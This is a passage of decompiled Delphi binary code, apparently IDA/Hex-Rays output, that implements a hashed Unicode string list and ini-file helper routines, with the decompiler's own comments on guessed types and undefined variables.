_DWORD *__usercall sub_43E210@<eax>(int dwMessageId@<edx>, int a2@<edi>, int a3@<esi>)
{
  int v5; // edx
  int v6; // eax
  unsigned int v8[2]; // [esp-Ch] [ebp-24h] BYREF
  int *v9; // [esp-4h] [ebp-1Ch]
  int v10; // [esp+4h] [ebp-14h] BYREF
  int v11; // [esp+8h] [ebp-10h] BYREF
  char v12; // [esp+Ch] [ebp-Ch]
  int v13; // [esp+10h] [ebp-8h]
  char v14; // [esp+14h] [ebp-4h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v10 = 0;
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_43E280;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  if ( dwMessageId )
  {
    sub_4194F8(dwMessageId, 0, &v10);
    v11 = v10;
    v12 = 17;
    v13 = dwMessageId;
    v14 = 0;
    LOBYTE(v5) = 1;
    v6 = Sysutils::Exception::Exception((int)cls_CrossPlatform_EThread, v5, off_468008, (int)&v11, 1);
    sub_406340(v6, dwMessageId, (int)&savedregs, a2, a3);
  }
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_43E287;
  return sub_406C44(&v10);
}
// 43E260: variable 'v5' is possibly undefined
// 422F54: using guessed type int (*cls_CrossPlatform_EThread[2])();

//----- (0043E290) --------------------------------------------------------
int __usercall sub_43E290@<eax>(int result@<eax>, int a2@<edi>, int a3@<esi>)
{
  if ( !*(_BYTE *)(result + 12) )
    return sub_43DF70(result, 1u, a2, a3);
  return result;
}

//----- (0043E2B0) --------------------------------------------------------
void __usercall sub_43E2B0(char a1@<dl>, int a2@<edi>, int a3@<esi>)
{
  int LastError_1; // eax

  if ( !a1 )
  {
    LastError_1 = GetLastError_1();
    sub_43E210(LastError_1, a2, a3);
  }
}

//----- (0043E2D0) --------------------------------------------------------
void sub_43E2D0()
{
  ++dword_46EDC0;
}
// 46EDC0: using guessed type int dword_46EDC0;

//----- (0043E5A0) --------------------------------------------------------
int __fastcall sub_43E5A0(int a1, int a2, int a3)
{
  unsigned int v4; // esi
  unsigned int v5; // ecx
  int v6; // edi
  int v7; // esi
  int result; // eax
  unsigned int v9; // [esp+Ch] [ebp-Ch]

  v4 = sub_43E770(a1, a2);
  v9 = *(_DWORD *)(a1 + 4);
  v5 = v9;
  if ( v9 )
    v5 = *(_DWORD *)(v9 - 4);
  v6 = v4 % v5;
  v7 = System::__linkproc__ New(12, &byte_43E2F8);
  sub_406FE8((volatile __int32 *)(v7 + 4), a2);
  *(_DWORD *)(v7 + 8) = a3;
  *(_DWORD *)v7 = *(_DWORD *)(*(_DWORD *)(a1 + 4) + 4 * v6);
  result = *(_DWORD *)(a1 + 4);
  *(_DWORD *)(result + 4 * v6) = v7;
  return result;
}
// 408520: using guessed type int __fastcall System::__linkproc__ New(_DWORD, _DWORD);
// 43E2F8: using guessed type char byte_43E2F8;

//----- (0043E610) --------------------------------------------------------
int __fastcall sub_43E610(int a1)
{
  int v1; // eax
  int result; // eax
  int v3; // edi
  _DWORD *v4; // ebx
  _DWORD *v5; // esi
  int v6; // [esp+Ch] [ebp-Ch]
  int v7; // [esp+10h] [ebp-8h]

  v6 = *(_DWORD *)(a1 + 4);
  v1 = v6;
  if ( v6 )
    v1 = *(_DWORD *)(v6 - 4);
  result = v1 - 1;
  if ( result >= 0 )
  {
    v7 = result + 1;
    v3 = 0;
    do
    {
      v4 = *(_DWORD **)(*(_DWORD *)(a1 + 4) + 4 * v3);
      if ( v4 )
      {
        do
        {
          v5 = (_DWORD *)*v4;
          System::__linkproc__ Dispose(v4, &byte_43E2F8);
          v4 = v5;
        }
        while ( v5 );
      }
      result = *(_DWORD *)(a1 + 4);
      *(_DWORD *)(result + 4 * v3++) = 0;
      --v7;
    }
    while ( v7 );
  }
  return result;
}
// 408534: using guessed type int __fastcall System::__linkproc__ Dispose(_DWORD, _DWORD);
// 43E2F8: using guessed type char byte_43E2F8;

//----- (0043E6E0) --------------------------------------------------------
int sub_43E6E0()
{
  __int64 v0; // rax
  char v1; // bl
  int v2; // esi
  int result; // eax

  v0 = System::__linkproc__ BeforeDestruction();
  v1 = BYTE4(v0);
  v2 = v0;
  sub_43E610(v0);
  result = sub_405588();
  if ( v1 > 0 )
    return System::__linkproc__ ClassDestroy(v2);
  return result;
}
// 4058C4: using guessed type int __fastcall System::__linkproc__ ClassDestroy(_DWORD);

//----- (0043E710) --------------------------------------------------------
_DWORD *__fastcall sub_43E710(int a1, int a2)
{
  unsigned int v4; // esi
  unsigned int v5; // ecx
  _DWORD *i; // ebx
  char v7; // zf
  _DWORD *v8; // esi
  unsigned int v10; // [esp+Ch] [ebp-4h]

  v4 = sub_43E770(a1, a2);
  v10 = *(_DWORD *)(a1 + 4);
  v5 = v10;
  if ( v10 )
    v5 = *(_DWORD *)(v10 - 4);
  for ( i = (_DWORD *)(*(_DWORD *)(a1 + 4) + 4 * (v4 % v5)); ; i = v8 )
  {
    v8 = (_DWORD *)*i;
    if ( !*i )
      break;
    sub_407AA0(v8[1], a2);
    if ( v7 )
      break;
  }
  return i;
}
// 43E754: variable 'v7' is possibly undefined

//----- (0043E770) --------------------------------------------------------
unsigned int __fastcall sub_43E770(int a1, int a2)
{
  unsigned int result; // eax
  int v3; // ecx
  int v4; // ebx

  result = 0;
  v3 = a2;
  if ( a2 )
    v3 = *(_DWORD *)(a2 - 4);
  if ( v3 > 0 )
  {
    v4 = 1;
    do
    {
      result = *(unsigned __int16 *)(a2 + 2 * v4++ - 2) ^ ((result >> 30) | (4 * result));
      --v3;
    }
    while ( v3 );
  }
  return result;
}

//----- (0043E7B0) --------------------------------------------------------
int __fastcall sub_43E7B0(int a1, int a2)
{
  int v2; // eax

  v2 = *sub_43E710(a1, a2);
  if ( v2 )
    return *(_DWORD *)(v2 + 8);
  else
    return -1;
}

//----- (0043E7E0) --------------------------------------------------------
int __usercall sub_43E7E0@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<edi>)
{
  int v4; // ebx
  char v5; // al
  bool v6; // cf
  char v7; // al
  int v8; // eax
  int v9; // edx
  int v10; // edi
  int v11; // esi
  int v12; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-30h] BYREF
  void *v15; // [esp-8h] [ebp-2Ch]
  int *v16; // [esp-4h] [ebp-28h]
  int v17; // [esp+Ch] [ebp-18h] BYREF
  int v18; // [esp+10h] [ebp-14h] BYREF
  int v19; // [esp+14h] [ebp-10h] BYREF
  int v20; // [esp+18h] [ebp-Ch]
  int v21; // [esp+1Ch] [ebp-8h]
  int v22; // [esp+20h] [ebp-4h]
  int savedregs; // [esp+24h] [ebp+0h] BYREF

  v17 = 0;
  v18 = 0;
  v20 = a3;
  v21 = a2;
  v22 = a1;
  v16 = &savedregs;
  v15 = &loc_43E92B;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v4 = *(_DWORD *)(a1 + 4);
  if ( *(_BYTE *)(v4 + 16) )
  {
    if ( (unsigned __int8)sub_428DC0(*(_DWORD *)(a1 + 4), v21, &v19, v16, v15, ExceptionList) )
    {
      v5 = *(_BYTE *)(v4 + 17);
      v6 = v5 == 0;
      v7 = v5 - 1;
      if ( v6 )
        goto LABEL_20;
      if ( v7 == 1 )
      {
        sub_40B51C((int **)off_467F70, &v18);
        sub_428D20(v18, 0, a4);
      }
    }
  }
  else
  {
    v19 = *(_DWORD *)(v4 + 8);
  }
  v8 = *(_DWORD *)(v4 + 12);
  if ( v8 == *(_DWORD *)(v4 + 8) )
  {
    if ( v8 <= 64 )
    {
      if ( v8 <= 8 )
        v9 = 4;
      else
        v9 = 16;
    }
    else
    {
      v9 = *(int *)(v4 + 12) >> 2;
    }
    v10 = v9 + v8;
    if ( v9 + v8 < *(_DWORD *)(v4 + 8) )
    {
      sub_40B51C((int **)off_468068, &v17);
      sub_428D20(v17, v10, v10);
    }
    if ( v10 != *(_DWORD *)(v4 + 12) )
    {
      System::__linkproc__ DynArraySetLength(v10);
      *(_DWORD *)(v4 + 12) = v10;
    }
  }
  v11 = *(_DWORD *)(v4 + 4) + 8 * v19;
  if ( *(_DWORD *)(v4 + 8) - v19 > 0 )
    System::Move((const void *)(*(_DWORD *)(v4 + 4) + 8 * v19), (void *)(v11 + 8), 8 * (*(_DWORD *)(v4 + 8) - v19));
  *(_DWORD *)v11 = 0;
  *(_DWORD *)(v11 + 4) = v20;
  sub_406FE8((volatile __int32 *)v11, v21);
  ++*(_DWORD *)(v4 + 8);
LABEL_20:
  v12 = v22;
  *(_BYTE *)(v22 + 16) = 0;
  *(_BYTE *)(v12 + 17) = 0;
  __writefsdword(0, (unsigned int)ExceptionList);
  v16 = (int *)&loc_43E932;
  return sub_406CA4((int)&v17, 2);
}
// 43E869: conditional instruction was optimized away because eax.4>=41
// 408A10: using guessed type int __cdecl System::__linkproc__ DynArraySetLength(_DWORD);
// 428DC0: using guessed type int __fastcall sub_428DC0(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0043E940) --------------------------------------------------------
int __fastcall sub_43E940(int a1, char a2)
{
  char v2; // bl
  int v3; // esi
  int v4; // edx
  int v5; // edx

  if ( a2 )
    a1 = System::__linkproc__ ClassCreate();
  v2 = a2;
  v3 = a1;
  *(_DWORD *)(a1 + 4) = sub_405568((int)cls_CrossPlatform_TUnicodeStringList, 1);
  LOBYTE(v4) = 1;
  *(_DWORD *)(v3 + 12) = Dbxmetadatareader::TDBXBaseMetaDataReader::TDBXDataTypeCursor::TDBXDataTypeCursor(
                           &cls_IniUtil_TUnicodeStringHash,
                           v4,
                           256);
  LOBYTE(v5) = 1;
  *(_DWORD *)(v3 + 8) = Dbxmetadatareader::TDBXBaseMetaDataReader::TDBXDataTypeCursor::TDBXDataTypeCursor(
                          &cls_IniUtil_TUnicodeStringHash,
                          v5,
                          256);
  if ( v2 )
    System::__linkproc__ AfterConstruction(v3);
  return v3;
}
// 43E951: variable 'a2' is possibly undefined
// 43E970: variable 'v4' is possibly undefined
// 43E984: variable 'v5' is possibly undefined
// 4058CC: using guessed type int __fastcall System::__linkproc__ AfterConstruction(_DWORD);
// 4232BC: using guessed type int (*cls_CrossPlatform_TUnicodeStringList[3])();
// 43E3B8: using guessed type __int16 cls_IniUtil_TUnicodeStringHash;
// 43E680: using guessed type int __fastcall Dbxmetadatareader::TDBXBaseMetaDataReader::TDBXDataTypeCursor::TDBXDataTypeCursor(_DWORD, _DWORD, _DWORD);

//----- (0043E9B0) --------------------------------------------------------
int __fastcall sub_43E9B0(int a1, unsigned int System::AnsiString)
{
  Idthreadcomponent::TIdThreadComponent *v3; // ebx
  int v4; // esi
  int v5; // ebx
  int result; // eax

  v3 = *(Idthreadcomponent::TIdThreadComponent **)(a1 + 4);
  if ( *((_DWORD *)v3 + 2) <= System::AnsiString )
    Idthreadcomponent::TIdThreadComponent::SetThreadName(v3, System::AnsiString);
  v4 = *((_DWORD *)v3 + 1) + 8 * System::AnsiString;
  sub_407DEC(v4, (int)&unk_423578);
  v5 = --*((_DWORD *)v3 + 2) - System::AnsiString;
  if ( v5 > 0 )
  {
    System::Move((const void *)(v4 + 8), (void *)v4, 8 * v5);
    *(_DWORD *)(v4 + 8 * v5) = 0;
  }
  result = a1;
  *(_BYTE *)(a1 + 16) = 0;
  *(_BYTE *)(a1 + 17) = 0;
  return result;
}

//----- (0043EA30) --------------------------------------------------------
int __fastcall sub_43EA30(int a1, unsigned int System::AnsiString, unsigned int a3)
{
  Idthreadcomponent::TIdThreadComponent *v5; // ebx
  int *v6; // eax
  int *v7; // edx
  int v8; // ecx
  int v9; // ecx
  int result; // eax

  v5 = *(Idthreadcomponent::TIdThreadComponent **)(a1 + 4);
  if ( *((_DWORD *)v5 + 2) <= System::AnsiString )
    Idthreadcomponent::TIdThreadComponent::SetThreadName(v5, System::AnsiString);
  if ( *((_DWORD *)v5 + 2) <= a3 )
    Idthreadcomponent::TIdThreadComponent::SetThreadName(v5, a3);
  v6 = (int *)(*((_DWORD *)v5 + 1) + 8 * System::AnsiString);
  v7 = (int *)(*((_DWORD *)v5 + 1) + 8 * a3);
  v8 = *v6;
  *v6 = *v7;
  *v7 = v8;
  v9 = v6[1];
  v6[1] = v7[1];
  v7[1] = v9;
  result = a1;
  *(_BYTE *)(a1 + 16) = 0;
  *(_BYTE *)(a1 + 17) = 0;
  return result;
}

//----- (0043EAA0) --------------------------------------------------------
int sub_43EAA0()
{
  __int64 v0; // rax
  char v1; // bl
  int v2; // esi
  int result; // eax

  v0 = System::__linkproc__ BeforeDestruction();
  v1 = BYTE4(v0);
  v2 = v0;
  sub_405598(*(_DWORD **)(v0 + 8));
  sub_405598(*(_DWORD **)(v2 + 12));
  sub_405598(*(_DWORD **)(v2 + 4));
  result = sub_405588();
  if ( v1 > 0 )
    return System::__linkproc__ ClassDestroy(v2);
  return result;
}
// 4058C4: using guessed type int __fastcall System::__linkproc__ ClassDestroy(_DWORD);

//----- (0043EAE0) --------------------------------------------------------
int __fastcall sub_43EAE0(int a1, int cchLength, char a3)
{
  int v5; // ebx
  unsigned int v7[2]; // [esp-14h] [ebp-18h] BYREF
  int *v8; // [esp-Ch] [ebp-10h]
  int v9; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v9 = 0;
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_43EB3E;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  if ( !a3 || *(_BYTE *)(a1 + 16) )
  {
    sub_43ED30(a1);
    sub_426A10(cchLength, &v9);
    v5 = sub_43E7B0(*(_DWORD *)(a1 + 8), v9);
  }
  else
  {
    v5 = -2;
  }
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_43EB45;
  sub_406C44(&v9);
  return v5;
}

//----- (0043EB50) --------------------------------------------------------
int __fastcall sub_43EB50(int a1, int cchLength, char a3)
{
  int v5; // ebx
  unsigned int v7[2]; // [esp-14h] [ebp-18h] BYREF
  int *v8; // [esp-Ch] [ebp-10h]
  int v9; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v9 = 0;
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_43EBAE;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  if ( !a3 || *(_BYTE *)(a1 + 17) )
  {
    sub_43EBC0(a1, a1);
    sub_426A10(cchLength, &v9);
    v5 = sub_43E7B0(*(_DWORD *)(a1 + 12), v9);
  }
  else
  {
    v5 = -2;
  }
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_43EBB5;
  sub_406C44(&v9);
  return v5;
}

//----- (0043EBC0) --------------------------------------------------------
int __usercall sub_43EBC0@<eax>(int a1@<eax>, int a2@<ebx>)
{
  Idthreadcomponent::TIdThreadComponent *v2; // ebx
  unsigned int v3; // eax
  unsigned int v5[2]; // [esp-1Ch] [ebp-38h] BYREF
  int *v6; // [esp-14h] [ebp-30h]
  unsigned int v7[2]; // [esp-10h] [ebp-2Ch] BYREF
  int *v8; // [esp-8h] [ebp-24h]
  int v9; // [esp-4h] [ebp-20h]
  DWORD cchLength; // [esp+0h] [ebp-1Ch] BYREF
  int v11; // [esp+4h] [ebp-18h] BYREF
  int v12; // [esp+8h] [ebp-14h]
  int System__AnsiString; // [esp+Ch] [ebp-10h]
  int v14; // [esp+10h] [ebp-Ch]
  __int32 v15; // [esp+14h] [ebp-8h] BYREF
  __int32 v16; // [esp+18h] [ebp-4h] BYREF
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  System__AnsiString = 0;
  v12 = 0;
  v11 = 0;
  cchLength = 0;
  v9 = a2;
  v14 = a1;
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_43ED08;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  if ( !*(_BYTE *)(a1 + 17) )
  {
    sub_43E610(*(_DWORD *)(v14 + 12));
    if ( *(_DWORD *)(*(_DWORD *)(v14 + 4) + 8) - 1 >= 0 )
    {
      v12 = *(_DWORD *)(*(_DWORD *)(v14 + 4) + 8);
      System__AnsiString = 0;
      do
      {
        v6 = &savedregs;
        v5[1] = (unsigned int)&loc_43EC73;
        v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
        __writefsdword(0, (unsigned int)v5);
        v2 = *(Idthreadcomponent::TIdThreadComponent **)(v14 + 4);
        sub_406C44(&v15);
        if ( *((_DWORD *)v2 + 2) <= (unsigned int)System__AnsiString )
          Idthreadcomponent::TIdThreadComponent::SetThreadName(v2, System__AnsiString);
        sub_407030(&v15, *(_DWORD *)(*((_DWORD *)v2 + 1) + 8 * System__AnsiString));
        sub_407030(&v16, v15);
        __writefsdword(0, v5[0]);
        v6 = (int *)&loc_43EC7A;
        sub_406C44(&v15);
        v3 = sub_407B7C((int)dword_43ED20, v16, 1);
        if ( v3 )
        {
          sub_407AD8(v16, 1, v3 - 1, &cchLength);
          sub_426A10(cchLength, &v11);
          sub_407030(&v16, v11);
          sub_43E5A0(*(_DWORD *)(v14 + 12), v16, System__AnsiString);
        }
        ++System__AnsiString;
        --v12;
      }
      while ( v12 );
    }
    *(_BYTE *)(v14 + 17) = 1;
  }
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_43ED0F;
  sub_406CA4((int)&cchLength, 2);
  return sub_406CA4((int)&v15, 2);
}
// 43EBC0: could not find valid save-restore pair for ebx
// 43ED20: using guessed type int dword_43ED20[4];

//----- (0043ED30) --------------------------------------------------------
_DWORD *__fastcall sub_43ED30(int a1)
{
  Idthreadcomponent::TIdThreadComponent *v1; // ebx
  unsigned int v3[2]; // [esp-18h] [ebp-30h] BYREF
  int *v4; // [esp-10h] [ebp-28h]
  unsigned int v5[2]; // [esp-Ch] [ebp-24h] BYREF
  int *v6; // [esp-4h] [ebp-1Ch]
  int v7; // [esp+4h] [ebp-14h] BYREF
  int v8; // [esp+8h] [ebp-10h]
  int System__AnsiString; // [esp+Ch] [ebp-Ch]
  int v10; // [esp+10h] [ebp-8h]
  DWORD cchLength; // [esp+14h] [ebp-4h] BYREF
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v7 = 0;
  cchLength = 0;
  v10 = a1;
  v6 = &savedregs;
  v5[1] = (unsigned int)&loc_43EE2A;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  if ( !*(_BYTE *)(a1 + 16) )
  {
    sub_43E610(*(_DWORD *)(v10 + 8));
    if ( *(_DWORD *)(*(_DWORD *)(v10 + 4) + 8) - 1 >= 0 )
    {
      v8 = *(_DWORD *)(*(_DWORD *)(v10 + 4) + 8);
      System__AnsiString = 0;
      do
      {
        v4 = &savedregs;
        v3[1] = (unsigned int)&loc_43EDF6;
        v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
        __writefsdword(0, (unsigned int)v3);
        v1 = *(Idthreadcomponent::TIdThreadComponent **)(v10 + 4);
        sub_406C44(&cchLength);
        if ( *((_DWORD *)v1 + 2) <= (unsigned int)System__AnsiString )
          Idthreadcomponent::TIdThreadComponent::SetThreadName(v1, System__AnsiString);
        sub_407030((volatile __int32 *)&cchLength, *(_DWORD *)(*((_DWORD *)v1 + 1) + 8 * System__AnsiString));
        sub_426A10(cchLength, &v7);
        sub_43E5A0(*(_DWORD *)(v10 + 8), v7, System__AnsiString);
        __writefsdword(0, v3[0]);
        v4 = (int *)&loc_43EDFD;
        sub_406C44(&cchLength);
        ++System__AnsiString;
        --v8;
      }
      while ( v8 );
    }
    *(_BYTE *)(v10 + 16) = 1;
  }
  __writefsdword(0, v5[0]);
  v6 = (int *)&loc_43EE31;
  sub_406C44(&v7);
  return sub_406C44(&cchLength);
}

//----- (0043EE40) --------------------------------------------------------
int __fastcall sub_43EE40(int a1, int cchLength)
{
  int v3; // eax
  unsigned int v4; // ebx
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-18h] BYREF
  void *v7; // [esp-8h] [ebp-14h]
  int *v8; // [esp-4h] [ebp-10h]
  int v9; // [esp+0h] [ebp-Ch]
  unsigned __int8 v10; // [esp+7h] [ebp-5h]
  int v11; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v11 = a1;
  (*(void (__fastcall **)(_DWORD))(**(_DWORD **)(a1 + 20) + 20))(*(_DWORD *)(a1 + 20));
  v8 = &savedregs;
  v7 = &loc_43EEBC;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v10 = 0;
  v3 = sub_43EAE0(*(_DWORD *)(v11 + 4), cchLength, 0);
  if ( v3 > 0 )
  {
    v4 = v3;
    do
    {
      sub_43EA30(*(_DWORD *)(v11 + 4), v4, v4 - 1);
      --v4;
    }
    while ( v4 );
    v10 = 1;
    __writefsdword(0, (unsigned int)ExceptionList);
    (*(void (__fastcall **)(_DWORD, _DWORD, int *, int, void *))(**(_DWORD **)(v11 + 20) + 24))(
      *(_DWORD *)(v11 + 20),
      **(_DWORD **)(v11 + 20),
      v8,
      v9,
      &loc_43EEC3);
  }
  else
  {
    System::__linkproc__ TryFinallyExit(ExceptionList, v7, v8);
  }
  return v10;
}
// 43EE88: conditional instruction was optimized away because eax.4>=1
// 406434: using guessed type _DWORD __stdcall System::__linkproc__ TryFinallyExit(_DWORD, _DWORD, _DWORD);

//----- (0043EED0) --------------------------------------------------------
int __fastcall sub_43EED0(int a1, int a2)
{
  int v4; // esi

  v4 = sub_43E940((int)&cls_IniUtil_THashedUnicodeStringList, 1);
  sub_43E7E0(*(_DWORD *)(a1 + 4), a2, v4, a2);
  return v4;
}
// 43E470: using guessed type __int16 cls_IniUtil_THashedUnicodeStringList;

//----- (0043EF00) --------------------------------------------------------
int __fastcall sub_43EF00(int a1)
{
  int v1; // eax
  int v2; // edi
  unsigned int v3; // ebx
  int v4; // esi
  int v5; // ebx
  int result; // eax

  v1 = *(_DWORD *)(*(_DWORD *)(a1 + 4) + 4);
  if ( *(_DWORD *)(v1 + 8) - 1 >= 0 )
  {
    v2 = *(_DWORD *)(v1 + 8);
    v3 = 0;
    do
    {
      v4 = *(_DWORD *)(*(_DWORD *)(a1 + 4) + 4);
      if ( *(_DWORD *)(v4 + 8) <= v3 )
        Idthreadcomponent::TIdThreadComponent::SetThreadName(
          *(Idthreadcomponent::TIdThreadComponent **)(*(_DWORD *)(a1 + 4) + 4),
          v3);
      sub_405598(*(_DWORD **)(*(_DWORD *)(v4 + 4) + 8 * v3++ + 4));
      --v2;
    }
    while ( v2 );
  }
  v5 = *(_DWORD *)(a1 + 4);
  (*(void (__fastcall **)(_DWORD))(**(_DWORD **)(v5 + 4) + 4))(*(_DWORD *)(v5 + 4));
  result = v5;
  *(_BYTE *)(v5 + 16) = 0;
  *(_BYTE *)(v5 + 17) = 0;
  return result;
}

//----- (0043EF70) --------------------------------------------------------
int __userpurge sub_43EF70@<eax>(
        int a1@<eax>,
        char a2@<dl>,
        int a3@<ecx>,
        _DWORD **a4@<edi>,
        char a5,
        int a6,
        char a7,
        char a8)
{
  int v8; // esi
  int v9; // ecx
  int v10; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-1Ch] [ebp-30h] BYREF
  void *v13; // [esp-18h] [ebp-2Ch]
  int *v14; // [esp-14h] [ebp-28h]
  int v15; // [esp-10h] [ebp-24h]
  int v16; // [esp-Ch] [ebp-20h]
  unsigned int v17[2]; // [esp-8h] [ebp-1Ch] BYREF
  int *v18; // [esp+0h] [ebp-14h]
  int v19; // [esp+4h] [ebp-10h]
  int v20; // [esp+8h] [ebp-Ch] BYREF
  char v21; // [esp+Fh] [ebp-5h]
  int v22; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v20 = 0;
  if ( a2 )
    a1 = System::__linkproc__ ClassCreate();
  v8 = a3;
  v21 = a2;
  v22 = a1;
  v14 = &savedregs;
  v13 = &loc_43F089;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_405568(a1, 0);
  sub_4246C0((int)&v20);
  System::__linkproc__ IntfCopy(v22 + 20, v20);
  (*(void (__fastcall **)(_DWORD, _DWORD, int, unsigned int, int, int, int *, void *, struct _EXCEPTION_REGISTRATION_RECORD *))(**(_DWORD **)(v22 + 20) + 20))(
    *(_DWORD *)(v22 + 20),
    **(_DWORD **)(v22 + 20),
    v9,
    v17[0],
    v16,
    v15,
    v14,
    v13,
    ExceptionList);
  v18 = &savedregs;
  v17[1] = (unsigned int)&loc_43F06C;
  v17[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v17);
  sub_406FE8((volatile __int32 *)(v22 + 12), v8);
  *(_BYTE *)(v22 + 9) = a8;
  *(_BYTE *)(v22 + 16) = a7;
  *(_BYTE *)(v22 + 10) = a6;
  *(_BYTE *)(v22 + 17) = a5;
  v10 = sub_43E940((int)&cls_IniUtil_THashedUnicodeStringList, 1);
  *(_DWORD *)(v22 + 4) = v10;
  if ( !(_BYTE)a6 && (unsigned __int8)sub_426B00(*(_DWORD *)(v22 + 12)) && sub_426C60(*(_DWORD *)(v22 + 12)) )
    sub_426C10(*(_DWORD *)(v22 + 12), a6);
  sub_43FBF0(v22, a4, v8);
  __writefsdword(0, v17[0]);
  (*(void (__fastcall **)(_DWORD, _DWORD, int *, int, int, void *))(**(_DWORD **)(v22 + 20) + 24))(
    *(_DWORD *)(v22 + 20),
    **(_DWORD **)(v22 + 20),
    v18,
    v20,
    v19,
    &loc_43F073);
  __writefsdword(0, v17[0]);
  v18 = (int *)&loc_43F090;
  System::__linkproc__ IntfClear(&v20);
  if ( v21 )
    System::__linkproc__ AfterConstruction(v22);
  return v22;
}
// 43EF89: variable 'a3' is possibly undefined
// 43EF8B: variable 'a2' is possibly undefined
// 43EFCA: variable 'v9' is possibly undefined
// 4058CC: using guessed type int __fastcall System::__linkproc__ AfterConstruction(_DWORD);
// 40A04C: using guessed type int __fastcall System::__linkproc__ IntfClear(_DWORD);
// 40A064: using guessed type int __fastcall System::__linkproc__ IntfCopy(_DWORD, _DWORD);
// 43E470: using guessed type __int16 cls_IniUtil_THashedUnicodeStringList;
// 43EF70: using guessed type int var_C;

//----- (0043F0C0) --------------------------------------------------------
int __usercall sub_43F0C0@<eax>(int a1@<eax>, int cchLength@<edx>, int a3@<ecx>, int a4@<esi>)
{
  int v6; // ebx
  int v7; // eax
  unsigned int v9[2]; // [esp-8h] [ebp-18h] BYREF
  int *v10; // [esp+0h] [ebp-10h]
  int v11; // [esp+4h] [ebp-Ch]
  _DWORD *v12; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v12 = (_DWORD *)a1;
  (*(void (__fastcall **)(_DWORD, _DWORD))(**(_DWORD **)(a1 + 20) + 20))(*(_DWORD *)(a1 + 20), **(_DWORD **)(a1 + 20));
  v10 = &savedregs;
  v9[1] = (unsigned int)&loc_43F15C;
  v9[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  v6 = sub_43EAE0(v12[1], cchLength, 0);
  if ( v6 >= 0 )
  {
    a4 = *(_DWORD *)(v12[1] + 4);
    if ( *(_DWORD *)(a4 + 8) <= (unsigned int)v6 )
      Idthreadcomponent::TIdThreadComponent::SetThreadName(*(Idthreadcomponent::TIdThreadComponent **)(v12[1] + 4), v6);
    v6 = *(_DWORD *)(*(_DWORD *)(a4 + 4) + 8 * v6 + 4);
    v7 = sub_43EB50(v6, a3, 0);
    if ( v7 >= 0 )
    {
      sub_43E9B0(v6, v7);
      *((_BYTE *)v12 + 8) = 1;
    }
  }
  sub_43FE20(v12, (const void *)v6, a3, a4);
  __writefsdword(0, v9[0]);
  return (*(int (__fastcall **)(_DWORD, _DWORD, int *, int, void *))(*(_DWORD *)v12[5] + 24))(
           v12[5],
           *(_DWORD *)v12[5],
           v10,
           v11,
           &loc_43F163);
}

//----- (0043F170) --------------------------------------------------------
int __usercall sub_43F170@<eax>(const void *a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  __int64 v3; // rax
  _DWORD *v4; // eax
  int result; // eax
  unsigned int v6[2]; // [esp-8h] [ebp-14h] BYREF
  int *v7; // [esp+0h] [ebp-Ch]
  char v8; // [esp+7h] [ebp-5h]
  int v9; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v3 = System::__linkproc__ BeforeDestruction();
  v8 = BYTE4(v3);
  v9 = v3;
  (*(void (__fastcall **)(_DWORD, _DWORD))(**(_DWORD **)(v3 + 20) + 20))(*(_DWORD *)(v3 + 20), **(_DWORD **)(v3 + 20));
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_43F1E6;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  if ( *(_BYTE *)(v9 + 8) )
    sub_440870(v9, a1, a2, a3);
  sub_43EF00(v9);
  v7 = (int *)(v9 + 4);
  v4 = *(_DWORD **)(v9 + 4);
  *(_DWORD *)(v9 + 4) = 0;
  sub_405598(v4);
  __writefsdword(0, v6[0]);
